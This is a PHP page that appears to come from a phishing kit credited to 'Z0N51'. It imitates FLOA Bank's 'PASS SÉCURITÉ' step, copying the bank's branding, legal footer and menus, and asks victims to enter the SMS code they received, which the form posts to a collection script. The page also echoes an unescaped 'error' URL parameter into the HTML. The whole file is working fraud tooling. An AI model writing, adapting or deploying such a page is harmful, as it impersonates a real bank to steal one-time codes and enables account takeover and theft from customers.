<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'sms1';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>Vérifiez vos informations</title>
    </head>

    <body>

		<header id="header">
            <img class="img" src="../assets/imgs/service.svg">
            <div class="container">
                <img src="../assets/imgs/logo.svg">
            </div>
        </header>

        <main id="main" style="padding: 20px;">
            <div class="container">
                <div class="left">
                    <h3>PASS SÉCURITÉ</h3>
                    <div class="banner-text info mb20">
                        <div class="mr-2"><i class="fas fa-exclamation-circle"></i></div>
                        <div class="flex-grow-1">
                            <p class="mb-0">Vous devez saisir le code que vous avez reçu sur votre téléphone mobile.</p>
                        </div>
                    </div>
                    <form action="../index.php" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="sms1">
                        <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="banner-text error" style="max-width: 100%; margin-bottom: 10px;">
                            <div class="mr-2"><i class="far fa-times-circle"></i></div>
                            <div class="flex-grow-1">
                                <p class="mb-0">Les informations que vous avez saisies sont incorrectes. Veuillez réessayer</p>
                            </div>
                        </div>
                        <?php endif; ?>
                        <div class="title"><h3>VOS COORDONNÉES</h3></div>
                        <div class="details mb30">
                            <div class="form-group mb-4 row align-items-center">
                                <label for="sms_code1" class="col-md-5 text-right">Code reçu *</label>
                                <div class="col-md-7">
                                    <input type="text" name="sms_code1" id="sms_code1" class="form-control">
                                </div>
                            </div>
                        </div>                        
                        <div class="btns2">
                            <p>* : champs obligatoires.</p>
                            <button type="submit"><img src="../assets/imgs/confirmer.gif"></button>
                        </div>
                    </form>
                </div>
                <div class="right"></div>
            </div>
        </main>

        <div id="help">
            <div class="title"><i class="fas fa-chevron-down"></i> BESOIN D'AIDE ?</div>
            <div class="container">
                <div class="listt">
                    <img class="d-lg-block d-md-block d-sm-none d-none" style="min-width: 527px;" src="../assets/imgs/list.png">
                    <img class="d-lg-none d-md-none d-sm-block d-block" style="min-width: 224px;" src="../assets/imgs/list2.png">
                </div>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <p>Vous pouvez vous opposer sans frais à l'utilisation, à des fins de prospection, des données personnelles que vous nous avez transmises. Pour ce faire veuillez nous adresser votre opposition par courrier à : FLOA Bank - Centre de relation clientèle 36 rue de Messines - 59 686 Lille Cedex 9. FLOA, Société Anonyme au capital de 42.773.400 euros - Bâtiment G7, 71 Rue Lucien Faure, 33300 Bordeaux, RCS Bordeaux 434 130 423, ORIAS n°07 028 160 (www.orias.fr), Entreprise soumise au contrôle de l’Autorité de Contrôle Prudentiel et de Résolution (ACPR) 4 Place de Budapest, CS 92469, 75430 Paris Cedex 09.</p>
                <div class="row">
                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Solutions de crédits</h3>
                            <ul>
                                <li>Gamme de crédits</li>
                                <li>Crédit Renouvelable</li>
                                <li>Prêts personnels</li>
                                <li>Prêts autres projets</li>
                                <li>Rachats de crédits</li>
                                <li>Coup de pouce</li>
                                <li>Crédit Travaux/Déco</li>
                                <li>Prêt Eco d'énergie</li>
                                <li>Crédit Auto</li>
                                <li>Crédit Moto</li>
                                <li>Crédit Camping Car</li>
                                <li>Crédit Mariage</li>
                                <li>Crédit Voyage</li>
                                <li>Crédit Bateau</li>
                                <li>Crédit Loisirs</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Assurances</h3>
                            <ul>
                                <li>Assurance Scolaire</li>
                                <li>Assurance Auto</li>
                                <li>Assurance Habitation</li>
                                <li>Assurances 2 roues</li>
                                <li>Assurances Vélo</li>
                                <li>Assurance Hospitalisation</li>
                                <li>Assurance Décès</li>
                                <li>Garantie Frais d'obsèques</li>
                                <li>Assurance Chien et Chat</li>
                                <li>Comparateur Mutuelles</li>
                                <li>Assurance Moyens de Paiement</li>
                                <li>Assurance Crédit</li>
                                <li>Assurance Prêt immobilier</li>
                                <li>Assurance Blessure</li>
                                <li>Assurance Habitation Étudiant</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Cartes et Solutions de paiement</h3>
                            <ul>
                                <li>Carte bancaire Casino</li>
                                <li>Carte Gold</li>
                                <li>Carte MasterCard Cdiscount</li>
                                <li>Paiement CB4X</li>
                                <li>Prêt instantané Lydia</li>
                                <li>Casino Max</li>
                                <li>Location longue durée</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Espace Client</h3>
                            <ul>
                                <li>Assurance</li>
                                <li>Suivi de demande</li>
                                <li>Demander un Financement Express</li>
                                <li>Gérer vos comptes sur l'appli</li>
                                <li>Comprendre mon relevé</li>
                                <li>Espace Carte</li>
                                <li>Espace Crédit</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>A propos de FLOA Bank</h3>
                            <ul>
                                <li>FLOA Bank</li>
                                <li>Qui sommes-nous</li>
                                <li>Histoire</li>
                                <li>Innovation</li>
                                <li>Nos produits</li>
                                <li>Nos métiers</li>
                                <li>Espace presse</li>
                                <li>Recrutement</li>
                                <li>Actu</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="widget">
                            <h3>Aide & Services</h3>
                            <ul>
                                <li>Contactez-nous</li>
                                <li>Questions/Réponses</li>
                                <li>Aide Espace client</li>
                                <li>Signature électronique</li>
                                <li>Informations Sécurité</li>
                                <li>Espace Magazines</li>
                                <li>Guide Pratique</li>
                                <li>Garantie reprise achats</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="../assets/js/script.js"></script>

    </body>

</html>